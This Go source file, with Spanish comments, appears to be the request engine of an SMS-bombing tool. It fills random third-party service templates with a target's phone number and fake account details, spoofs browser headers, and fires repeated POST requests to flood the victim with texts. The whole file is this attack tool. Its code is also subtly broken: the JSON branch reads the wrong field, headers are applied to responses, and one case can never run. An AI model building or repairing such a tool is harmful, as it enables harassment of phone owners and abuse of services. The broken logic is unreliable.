package smsSpam

import (
	"bytes"
	"encoding/json"
	"log"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// retornara payload y dataType
func parse(phone string, service map[string]string) (string, string) {
	dataType := ""

	payload := service["url"]
	// data esta definido , cambia el valor de payload y dataType
	if _, exist := service["data"]; exist {
		payload = service["data"]
		dataType = "data"
	} else if _, exist := service["json"]; exist {
		payload = service["data"]
		dataType = "json"
	}
	// va a reemplazar los valores que esten  en el payload
	for key, val := range map[string]string{
		"'":          "\"",
		`%phone%`:    phone,
		`%phone5%`:   transformNumber(phone, 5),
		`%name%`:     randomName(),
		`%email%`:    randomEmail(),
		`%password%`: randomPass()} {
		// lo va a reepazar y va a cambiar key por val
		payload = strings.Replace(payload, key, val, -1)

	}
	return payload, dataType
}

// esto sirve para codificar el payload a url.Values
func encodeURLValues(params map[string]string) url.Values {
	v := make(url.Values)

	for key, value := range params {
		// va a cambiar el valor de key por value
		// obviamente si no existe se va a añadir con el valor ingresado
		v[key] = []string{value}
	}
	// y al final se retorna
	return v

}
func SendRequest(phone string) error {
	service := randomService()

	payload, dataType := parse(phone, service)
	headers := map[string]string{

		"X-Requested-With": "XMLHttpRequest",
		"Connection":       "keep-alive",
		"Pragma":           "no-cache",
		"Cache-Control":    "no-cache",
		"Accept-Encoding":  "gzip, deflate, br",
		"User-agent":       randomUserAgent(),
	}
	if _, exist := service["headers"]; exist {
		json.NewDecoder(bytes.NewBuffer([]byte(service["headers"]))).Decode(&headers)

	}
	client := http.Client{Timeout: time.Second * time.Duration(timeout)}
	switch dataType {
	case "data":
		for i := 0; i <= 10; i++ {
			var payloadForm map[string]string

			json.NewDecoder(strings.NewReader(payload)).Decode(&payloadForm)
			// va a enviar un post con un form data
			// como un query url
			req, err := client.PostForm(service["url"], encodeURLValues(payloadForm))

			if err != nil {
				return err
			}
			// esto sirve para cambiar los headers
			for key, val := range headers {

				req.Header.Set(key, val)
			}
		}

	case "json":
		for i := 0; i <= 10; i++ {
			// enviara un json
			req, err := client.Post(service["url"], "application/json", strings.NewReader(payload))
			if err != nil {
				return err
			}
			for key, val := range headers {
				req.Header.Set(key, val)
			}
		}

	case "url":
		for i := 0; i <= 10; i++ {
			log.Println(payload)
			// enviara una url con un query url
			req, err := client.Post(payload, "", nil)
			if err != nil {
				return err
			}
			for key, val := range headers {
				req.Header.Set(key, val)
			}

		}

	}
	return nil
}
